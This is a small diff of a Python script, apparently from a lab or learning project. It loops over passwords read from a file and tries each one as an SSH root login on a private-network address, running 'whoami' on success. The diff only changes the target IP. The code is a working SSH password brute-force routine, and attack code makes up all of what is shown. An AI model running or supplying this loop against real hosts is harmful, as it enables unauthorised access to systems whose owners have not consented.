@@ -24,4 +24,4 @@ def ssh_command(ip,user,passwd,command):
 fb = open('pass.txt', 'r', encoding='utf-8', errors='replace').readlines()
 for i in fb:
     print('尝试密码：', i, end='')
-    ssh_command('192.168.203.129', 'root', i.strip(), 'whoami')
+    ssh_command('192.168.1.129', 'root', i.strip(), 'whoami')
